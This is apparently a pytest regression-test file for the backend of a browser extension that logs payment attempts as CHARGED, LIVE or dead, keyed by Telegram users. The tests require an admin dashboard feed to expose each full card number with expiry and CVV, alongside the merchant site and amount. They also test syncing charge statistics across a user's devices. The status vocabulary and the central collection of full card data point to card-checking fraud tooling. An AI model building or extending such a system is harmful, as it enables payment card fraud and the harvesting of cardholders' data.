"""Regression tests for the Feb 2026 v2.2.6 admin-feed + cross-device sync.

1. `/api/admin/hits` must now return `username`, `card` (PAN|MM|YY|CVV), `site`,
   `amount`, `currency` alongside each hit so the admin dashboard charge feed
   can show the four details the owner requested (card / site / amount / user).

2. `/api/user/state` GET+POST must round-trip an arbitrary JSON blob keyed by
   the logged-in user's telegram_id — the mechanism the extension uses to sync
   `statistics` + `transactionHistory` across a user's PC and mobile.
"""
from __future__ import annotations

import os
import time

import pytest
import requests

BASE_URL = os.environ.get(
    "REACT_APP_BACKEND_URL",
    "https://address-mode-select.preview.emergentagent.com",
).rstrip("/")

STATUS_URL = f"{BASE_URL}/api/data/status"
STATE_URL = f"{BASE_URL}/api/user/state"
ADMIN_HITS_URL = f"{BASE_URL}/api/admin/hits"


def _headers(token, fingerprint):
    return {
        "Authorization": f"Bearer {token}",
        "X-Fingerprint": fingerprint,
        "X-Extension-Version": "9.9.9",
        "X-Extension-Version": "9.9.9",
        "Content-Type": "application/json",
    }


def test_admin_hits_feed_returns_username_card_site_amount(active_user, admin_by_id_user):
    tag = f"adminfeed_{int(time.time() * 1000)}"
    body = {
        "status": "CHARGED",
        "gateway": "Stripe",
        "url": f"https://checkout.stripe.com/pay/pi_{tag}",
        "hostname": "checkout.stripe.com",
        "response": "paid",
        "card": {"number": "4242424242424242", "month": "12", "year": "30", "cvv": "999"},
        "amount": 14.5,
        "currency": "USD",
    }
    r = requests.post(
        STATUS_URL,
        json=body,
        headers=_headers(active_user["token"], active_user["fingerprint"]),
        timeout=15,
    )
    assert r.status_code == 200, r.text
    hit_id = r.json().get("hitId")
    assert hit_id

    # Admin fetches the recent charged feed
    r2 = requests.get(
        ADMIN_HITS_URL + "?limit=20",
        headers={
            "Authorization": f"Bearer {admin_by_id_user['token']}",
            "X-Fingerprint": admin_by_id_user["fingerprint"],
            "X-Extension-Version": "9.9.9",
        "X-Extension-Version": "9.9.9",
        },
        timeout=15,
    )
    assert r2.status_code == 200, r2.text
    hits = r2.json().get("hits", [])
    row = next((h for h in hits if h.get("id") == hit_id), None)
    assert row is not None, f"just-inserted hit not returned in feed. got ids: {[h.get('id') for h in hits[:5]]}"

    # 4 required fields for the admin dashboard charge feed:
    assert "card" in row and row["card"], "missing full card string"
    assert "|" in row["card"], f"card must be PAN|MM|YY|CVV, got {row['card']!r}"
    assert row["card"].startswith("4242424242424242"), row["card"]
    assert row.get("site") == "checkout.stripe.com", row.get("site")
    assert row.get("amount") == 14.5, row.get("amount")
    assert row.get("currency") == "USD"
    assert "username" in row, "username field must be present (may be None)"


def test_user_state_roundtrip_is_shared_across_devices(active_user):
    """GET must return whatever was last POSTed for the same telegram_id.

    This is the raw mechanism that makes the same login on PC + mobile show
    the same statistics + history — the extension pushes on storage.change
    and pulls on startup / new-token.
    """
    h = _headers(active_user["token"], active_user["fingerprint"])
    payload = {
        "data": {
            "statistics": {"attempts": 42, "charged": 7, "ccnLive": 3, "dead": 32},
            "transactionHistory": [
                {"id": "tx1", "status": "CHARGED", "card": "4242...4242", "timestamp": 1_700_000_000_000},
                {"id": "tx2", "status": "LIVE", "card": "5555...5555", "timestamp": 1_700_000_100_000},
            ],
            "pushedAt": int(time.time() * 1000),
        }
    }
    p = requests.post(STATE_URL, json=payload, headers=h, timeout=15)
    assert p.status_code == 200, p.text
    assert p.json().get("success") is True

    g = requests.get(STATE_URL, headers=h, timeout=15)
    assert g.status_code == 200, g.text
    body = g.json()
    assert body.get("data") is not None
    assert body["data"]["statistics"]["charged"] == 7
    assert len(body["data"]["transactionHistory"]) == 2
    assert body.get("updatedAt")


def test_user_state_requires_auth():
    r = requests.get(STATE_URL, timeout=15)
    assert r.status_code in (401, 403)


def test_user_state_rejects_oversize_payload(active_user):
    h = _headers(active_user["token"], active_user["fingerprint"])
    big = {"blob": "x" * 300_000}  # ~300KB, over the 256KB cap
    r = requests.post(STATE_URL, json={"data": big}, headers=h, timeout=15)
    assert r.status_code == 413, f"expected 413, got {r.status_code}: {r.text}"
